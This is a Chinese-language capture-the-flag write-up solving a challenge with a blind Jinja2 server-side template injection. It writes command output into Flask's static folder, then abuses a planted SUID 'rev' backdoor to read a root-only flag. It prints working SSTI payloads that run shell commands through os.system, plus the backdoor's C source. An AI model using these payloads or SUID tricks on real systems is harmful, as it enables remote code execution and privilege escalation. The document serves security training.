# 22 第二十二章：血海核心·千年手段

## 题目简述

登录页存在 Jinja2 SSTI，但 `render_template_string()` 的返回值被丢弃，所以表达式输出不会直接出现在响应中。应用目录对低权限用户可写，Flask 又提供 `/static/` 路由，可以把命令结果写入静态文件实现回显。最终 flag 为 `root:root`、权限 `600`，还需利用题目自带的 SUID 程序 `/usr/bin/rev` 提权读取。

## 解题过程

入口先把用户名拼进模板，再执行模板，但没有接收渲染结果：

```python
login_msg = f"... Welcome: {username} ..."
render_template_string(login_msg)
```

因此 SSTI 确实会执行，只是返回值不可见。利用 Jinja2 全局函数 `lipsum` 进入其 Python 全局命名空间，调用 `os.system()`，将结果写到 Flask 静态目录：

```jinja2
{{ lipsum.__globals__['os'].system('mkdir -p /app/static; id > /app/static/id.txt') }}
```

把该载荷作为 `username` 提交，`password` 使用任意非空值，再访问 `/static/id.txt` 即可看到命令结果。后续枚举 SUID 文件也可使用同样的回显方式：

```jinja2
{{ lipsum.__globals__['os'].system('find / -perm -4000 -type f 2>/dev/null > /app/static/suid.txt') }}
```

题目环境中异常项为 `/usr/bin/rev`。仓库保留的 `rev.c` 揭示了它的真实行为：

```c
for (int i = 1; i + 1 < argc; i++) {
    if (strcmp("--HDdss", argv[i]) == 0) {
        execvp(argv[i + 1], &argv[i + 1]);
    }
}
```

该文件被设置为 `4755`。当参数中出现 `--HDdss` 时，它以当前有效身份执行后续程序；由于 SUID 所有者是 root，`/usr/bin/rev --HDdss cat /flag` 中的 `cat` 继承 root 有效 UID，可以越过 `/flag` 的 `600` 权限。

将提权命令和静态文件回显合并：

```jinja2
{{ lipsum.__globals__['os'].system('/usr/bin/rev --HDdss cat /flag > /app/static/flag.txt') }}
```

再次访问 `/static/flag.txt` 即可读取 flag。重定向文件由外层低权限 shell 在可写的 `/app/static` 中创建，而真正读取 `/flag` 的 `cat` 由 SUID 程序以 root 有效身份启动。

## 方法总结

本题包含两层边界：先把无回显 SSTI 转化为静态文件回显，再利用自定义 SUID 包装器跨越文件权限。看到陌生 SUID 程序时不能只试命令名，应检查其参数解析和 `exec*()` 调用；这里的固定开关 `--HDdss` 正是提权入口。无回显场景下，优先寻找应用自身可读取的写入位置，比部署复杂内存马更短、更稳定。
